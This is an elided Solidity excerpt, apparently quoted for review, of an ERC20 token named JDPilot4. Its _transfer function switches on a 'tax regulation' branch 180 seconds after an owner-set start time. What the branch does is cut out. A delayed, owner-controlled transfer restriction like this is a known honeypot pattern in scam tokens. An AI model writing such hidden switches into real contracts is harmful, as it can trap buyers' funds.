...
contract JDPilot4 is ERC20Burnable, Ownable {
    ...
    constructor (address router, address operator) ERC20("JDPilot4", "JDP4")
    {
    ...
    function isControlTransaction() private view returns (bool) {
        return (block.timestamp >= taxRegulationModInitTime + 180);
    }
    ...
    function _transfer(
        ...
        if (taxRegulationModOn && isControlTransaction() && from != address(this) && to != address(this)) {
